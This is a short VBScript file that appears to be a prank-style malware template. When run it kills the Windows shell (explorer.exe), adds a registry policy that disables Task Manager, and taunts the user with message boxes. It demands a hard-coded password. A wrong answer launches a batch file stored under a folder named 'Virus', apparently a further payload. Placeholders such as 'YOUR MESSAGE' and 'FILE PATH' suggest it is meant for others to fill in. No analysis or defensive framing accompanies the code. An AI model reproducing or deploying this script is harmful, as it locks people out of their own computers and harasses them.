Set cmd = CreateObject("wscript.shell")
Dim Input
pass = "Cool"

cmd.run "taskkill /f /im explorer.exe"
cmd.run "reg add HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f"
X=MsgBox("LOL")

Input=InputBox("NGL YOU SEEM DESTROYED")
If Input = pass Then
X=MsgBox("YOUR MESSAGE",0+64,"YOUR TITLE")
cmd.run "FILE PATH"
cmd.run "reg add HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 0 /f"
Else
X=MsgBox("YOU ARE AN IDIOT",0+16,"YOU ARE AN IDIOT")
cmd.run "C:\Users\Privat\Desktop\Virus\BlueBooter.bat"
End If